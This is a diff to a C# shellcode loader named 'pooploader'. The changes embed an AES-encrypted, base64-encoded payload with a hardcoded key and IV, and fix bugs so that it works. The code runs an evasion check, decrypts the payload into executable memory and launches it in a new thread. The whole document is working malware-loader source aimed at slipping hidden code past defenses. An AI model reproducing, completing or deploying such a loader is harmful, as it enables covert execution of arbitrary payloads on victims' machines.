@@ -1,18 +1,15 @@
-﻿using System;
+using System;
 using System.IO;
 using System.Runtime.InteropServices;
 using System.Text.RegularExpressions;
 using System.Security.Cryptography;
-//using Data = SharpWhispers.Data;
-//using Syscall = Syscalls.Syscalls;
-
+using System.Text;
 
 namespace pooploader
 {
     class Program
     {
-        [DllImport("kernel32.dll")]
-        static extern IntPtr GetCurrentProcess();
+
         [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
         static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
         [DllImport("kernel32.dll")]
@@ -41,7 +38,7 @@ namespace pooploader
                 }
             }
 
-            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
+            IntPtr mem = VirtualAllocExNuma((IntPtr)(-1), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0); // replaced GetCurrentPrcoess with a pointer to -1
             if (mem == null)
             {
                 return;
@@ -61,20 +58,20 @@ namespace pooploader
         {
             evade();
 
-            byte[] Key = Convert.FromBase64String("AAbCAwQFBg1IAQoLDA00Dw==");
-            byte[] IV = Convert.FromBase64String("AAEbAwQFBg1ICAoLDA00Dw==");
-            byte[] buf = new byte[688] {  };
+            string Key = "ie0sf6btebNBlzrX";
+            string IV = "tABaQ5Mud8GQQJ2X";
+            string buf = "i9fSe+ei9GFH33DRNe42rsMBCbWi+tPhBqklB0L4KeYhmY3mrTHCSE8BLLVBOKUoYZSLEV2j84zyMj6mY8IOybN4q6BnqBIR5A+tV8q0ZJyHJ1v/SfESLJeNreg8X5P9AMK+Mv5FkzILTllY9Kc+hD4weP8BjTNvQmv/azUslT0mYX7WkcxnMTHB1NErlzoYRc6Firg0hXpozVXIZgqrbHWdgqCb5ViClveve3R+muO/LAcJclcjTO6lPORcFEZ72SBTJ06Jxde1SLbtxoX8B6RTyVHo+rGzrA1P8MwraDemQuv4VK77Dv6Qn+igGViOZa/EcJY+2Egk1Iz0WKbCY/9B0Uei02F1068efL63+0flkEF6KwvCpUk+M8vYJ8X6";
 
-            byte[] aesDecrypt(byte[] CEncryptedShell, byte[] key, byte[] iv)
+            byte[] aesDecrypt(byte[] CEncryptedShell, string key, string iv)
             {
                 using (var aes = Aes.Create())
                 {
                     aes.KeySize = 128;
                     aes.BlockSize = 128;
-                    aes.Padding = PaddingMode.PKCS7;
+                    aes.Padding = PaddingMode.Zeros; // fixed padding to nullbytes
                     aes.Mode = CipherMode.CBC;
-                    aes.Key = key;
-                    aes.IV = iv;
+                    aes.Key = Encoding.UTF8.GetBytes(key);
+                    aes.IV = Encoding.UTF8.GetBytes(iv);
                     using (var decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
                     {
                         return GetDecrypt(CEncryptedShell, decryptor);
@@ -93,12 +90,11 @@ namespace pooploader
                 }
             }
 
-            byte[] dbuff = aesDecrypt(buf, Key, IV);
+            byte[] dec_blob = Convert.FromBase64String(buf);
+            byte[] dbuff = aesDecrypt(dec_blob, Key, IV);
             int len = dbuff.Length;
             IntPtr address = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
-            Marshal.Copy(dbuf, 0, address, len);
-            //IntPtr hThread = IntPtr.Zero;
-            //IntPtr poop = (uint)Syscall.NtCreateThreadEx(ref hThread, Data.Win32.WinNT.ACCESS_MASK.GENERIC_ALL, (IntPtr)0, IntPtr.Zero, address, IntPtr.Zero, false, 0, 0 , 0,IntPtr.Zero);
+            Marshal.Copy(dbuff, 0, address, len);
             IntPtr poop = CreateThread(IntPtr.Zero, 0, address, IntPtr.Zero, 0, IntPtr.Zero);
             WaitForSingleObject(poop, 0xFFFFFFFF);
         }
